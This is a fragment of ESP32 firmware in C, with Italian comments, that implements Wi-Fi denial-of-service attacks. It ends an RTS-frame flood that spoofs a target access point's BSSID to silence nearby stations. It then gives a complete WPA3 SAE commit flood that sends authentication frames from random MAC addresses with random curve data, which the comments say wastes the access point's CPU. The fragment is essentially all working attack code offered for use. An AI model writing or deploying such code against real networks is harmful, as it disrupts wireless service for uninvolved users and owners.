        0xB4, 0x00,                         // Frame Control (RTS)
        0xFF, 0x7F,                         // Duration (High value ~32ms)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver Address (Broadcast o Target)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter Address (Spoofed BSSID)
        // No Sequence control in Control Frames usually, but ESP32 API handles padding
    };

    memcpy(&rts_packet[4], bssid, 6);   // Receiver: Target AP (lo costringiamo a leggere)
    memcpy(&rts_packet[10], bssid, 6);  // Transmitter: Target AP (sembra che sia LUI a chiedere silenzio)

    // Invia burst di pacchetti
    for(int i=0; i<5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, rts_packet, 16, false); // Length 16 per RTS
        ets_delay_us(500); // Piccolo delay per non saturare il TX buffer
    }
}


void wifi_attack_wpa3_sae_flood(const uint8_t bssid[6])
{
    if (bssid == NULL) return;

    uint8_t sae_commit_packet[128]; 
    uint8_t rand_mac[6];
    esp_fill_random(rand_mac, 6);
    rand_mac[0] &= 0xFE; rand_mac[0] |= 0x02; // Unicast locale random

    // 1. Header 802.11 Authentication
    uint8_t header[] = {
        0xB0, 0x00,                         // FC: Auth
        0x3A, 0x01,                         // Duration
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Dest (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Random)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00                          // Seq
    };

    // 2. Auth Body: SAE (Algo=3), Seq=1 (Commit), Status=0
    uint8_t auth_body[] = {
        0x03, 0x00, // Auth Algorithm: SAE
        0x01, 0x00, // Auth Sequence: 1 (Commit)
        0x00, 0x00  // Status Code: Success
    };

    // 3. SAE Data (Semplificato per flood)
    // Group ID 19 (NIST P-256) è standard per WPA3
    // Scalar e Element dovrebbero essere punti validi sulla curva. 
    // Per un DoS flood, spesso basta inviare dati random di lunghezza corretta; 
    // l'AP sprecherà cicli CPU per scoprire che sono invalidi.
    uint8_t sae_data[64]; // Scalar (32) + Element (32) approssimativo
    esp_fill_random(sae_data, sizeof(sae_data));
    uint8_t group_id[] = {0x13, 0x00}; // Group 19 (Little Endian)

    // Costruzione pacchetto
    int offset = 0;
    memcpy(sae_commit_packet, header, sizeof(header));
    memcpy(&sae_commit_packet[4], bssid, 6);     // Dest
    memcpy(&sae_commit_packet[10], rand_mac, 6); // Src
    memcpy(&sae_commit_packet[16], bssid, 6);     // BSSID
    offset += sizeof(header);

    memcpy(&sae_commit_packet[offset], auth_body, sizeof(auth_body));
    offset += sizeof(auth_body);

    memcpy(&sae_commit_packet[offset], group_id, 2);
    offset += 2;

    memcpy(&sae_commit_packet[offset], sae_data, sizeof(sae_data));
    offset += sizeof(sae_data);

    // Invio
    esp_wifi_80211_tx(WIFI_IF_STA, sae_commit_packet, offset, false);
}